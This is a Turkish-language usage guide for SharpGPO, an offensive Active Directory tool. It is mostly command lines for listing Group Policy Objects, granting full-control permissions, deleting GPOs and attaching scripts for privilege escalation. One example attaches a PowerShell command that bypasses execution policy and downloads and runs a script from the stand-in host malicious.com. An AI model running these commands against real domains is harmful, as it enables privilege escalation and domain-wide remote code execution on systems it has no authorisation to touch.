c# SharpGPO.exe Kullanım Kılavuzu

## Giriş
SharpGPO, Active Directory ortamında Grup Politika Nesneleri (GPO) ile ilgili bilgi toplamak ve bu nesneleri manipüle etmek için tasarlanmış bir siber güvenlik aracıdır. Bu aracın amacı, GPO kullanımı ile ilgili zafiyetleri belirlemek ve bunlardan yararlanmaktır.

---

## Özellikler
- **GPO Bilgi Toplama**: Belirli bir Active Directory ortamındaki mevcut GPO nesnelerini listeler.
- **GPO Manipülasyonu**: Mevcut GPO nesnelerine izin ekleme, silme veya değiştirme.
- **Yetki Eskalasyonu**: Hatalı veya eksik konfigüre edilmiş GPO nesnelerinden yararlanarak yetki yükseltme.

---

## Gereksinimler
- Windows işletim sistemi
- Active Directory üzerinde yeterli yetkilere sahip bir hesap
- .NET Framework kurulu olmalıdır

---

## Komut Satırı Kullanımı

### Yardım Mesajını Görüntüleme
SharpGPO'nun yardım mesajını görmek için:
```cmd
SharpGPO.exe -h
```

### Tüm GPO Nesnelerini Listeleme
Domain ortamındaki mevcut tüm GPO nesnelerini listelemek için:
```cmd
SharpGPO.exe list
```

### Belirli Bir GPO Nesnesi Hakkında Detayları Görüntüleme
Belirli bir GPO nesnesinin detaylarını almak için:
```cmd
SharpGPO.exe details -name "GPO_NESNE_ADI"
```

### GPO Nesnesine Yeni Bir Kullanıcı Yetkisi Ekleme
Bir GPO nesnesine yeni bir kullanıcı veya grup eklemek için:
```cmd
SharpGPO.exe add-permission -name "GPO_NESNE_ADI" -user "KULLANICI_ADI" -permission "FULLCONTROL"
```

### GPO Nesnesinden Yetki Silme
Belirli bir kullanıcı veya grubun GPO yetkilerini silmek için:
```cmd
SharpGPO.exe remove-permission -name "GPO_NESNE_ADI" -user "KULLANICI_ADI"
```

### GPO Nesnesini Silme
Bir GPO nesnesini Active Directory'den silmek için:
```cmd
SharpGPO.exe delete -name "GPO_NESNE_ADI"
```

### Komut Dosyası Ekleyerek Yetki Eskalasyonu
Bir GPO nesnesine çalıştırılabilir bir komut dosyası eklemek için:
```cmd
SharpGPO.exe add-script -name "GPO_NESNE_ADI" -script "C:\Path\to\script.bat"
```

---

## Örnek Kullanımlar

### Varsayılan Domain Policy'sine Erişim Yetkisi Eklemek
Domain Policy'e "Administrator" kullanıcısı için tam kontrol yetkisi eklemek için:
```cmd
SharpGPO.exe add-permission -name "Default Domain Policy" -user "Administrator" -permission "FULLCONTROL"
```

### Tüm GPO Nesnelerini JSON Formatında Kaydetme
Domain'deki tüm GPO nesnelerini bir JSON dosyasına kaydetmek için:
```cmd
SharpGPO.exe list -format json -output "C:\Temp\gpo_list.json"
```

### Zararlı Bir Komut Dosyası Ekleyerek Yetki Yükseltme
Bir GPO nesnesine zararlı bir PowerShell betiği eklemek için:
```cmd
SharpGPO.exe add-script -name "Test GPO" -script "powershell.exe -ep bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')\""
```

---

## Derleme Talimatları
SharpGPO kaynak koddan derlenebilir.

### Adımlar:
1. Visual Studio Community Edition'ı yükleyin.
2. Projeyi açın (`SharpGPO.sln`).
3. Çözüm yapılandırmasını "Release" olarak seçin.
4. Projeyi derleyin.

---

## Kaynaklar
- [SharpGPO GitHub](https://github.com/GhostPack/SharpGPO)
- [GhostPack Belgeleri](https://posts.specterops.io/)

Bu rehber, SharpGPO aracını kullanmanın temel adımlarını kapsamaktadır. Daha fazla bilgi için yukarıdaki bağlantılara göz atabilirsiniz.
